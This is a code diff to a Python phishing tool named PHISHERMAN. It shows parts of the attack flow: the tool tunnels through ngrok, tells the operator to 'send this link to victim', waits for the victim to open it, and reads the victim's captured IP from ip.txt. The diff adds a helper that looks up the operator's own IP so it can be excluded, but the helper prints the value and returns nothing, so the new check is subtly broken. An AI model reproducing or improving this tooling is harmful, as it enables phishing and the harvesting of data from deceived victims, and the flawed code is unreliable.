@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3
 import subprocess
 from sys import exit
 import platform
@@ -11,20 +11,20 @@ j=[]
 try:
     from termcolor import colored
 except:
-    j+='termcolor'
+    j.append('termcolor')
 try:
     import requests
 except:
-    j+='requests'
+    j.append('requests')
 try:
     from bs4 import BeautifulSoup
 except:
-    j+='BeautifulSoup4'
+    j.append('BeautifulSoup4')
 if j:
-    print('PLEASE INSTALL THE FOLLOWING MODULES')
+    print('PLEASE INSTALL THE FOLLOWING MODULES\n')
     for a in j:
         print(a)
-    print('PLEASE RUN pip3 install -r requirements.txt BEFORE STARTING PHISHERMAN')
+    print('\nPLEASE RUN pip3 install -r requirements.txt BEFORE STARTING PHISHERMAN')
     exit()
     
 try:
@@ -32,6 +32,10 @@ try:
 except:
     print('PLEASE INSTALL PHP BEFORE STARTING PHISHERMAN')
     exit()
+
+def get_my_ip():
+    
+    print(requests.get('https://api.ipify.org/?format=json').content.decode('utf8').split(':')[-1][1:-2])
 
 def ngrok():
     try:
@@ -86,6 +90,7 @@ def attack(server,url,wifi):
     print()
     print(colored('[*] Send this link to victim  :  ','green',attrs=['bold'])+colored(link,'red',attrs=['bold']))
     print()
+    my_ip = get_my_ip()
     if '/' not in server:
         ztop = 0
         print(colored('[*] Waiting for victim to open the link....','yellow',attrs=['bold']))
@@ -94,7 +99,8 @@ def attack(server,url,wifi):
                 for file in files:
                     if 'ip.txt' in file:
                         f = open(path.join(root, file))                    
-                        if f.read():
+                        r = f.read()                    
+                        if r and r!=my_ip:
                             f.seek(0)
                             print()
                             re=f.read()
